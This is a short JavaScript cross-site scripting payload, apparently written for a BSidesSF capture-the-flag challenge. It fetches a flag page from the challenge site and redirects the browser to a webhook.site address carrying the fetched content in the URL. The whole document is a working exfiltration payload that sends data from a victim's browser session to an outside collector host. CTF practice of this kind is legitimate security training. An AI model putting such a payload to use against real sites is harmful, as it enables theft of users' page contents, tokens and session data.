fetch("https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag",{ mode: 'no-cors'})
    .then(response => response.text())
    .then(data => {
      window.location.href = `https://webhook.site/8f845f94-d0b4-4cc0-8564-0258f83074ee?responseFromXSS=${encodeURIComponent(data)}`;
    });
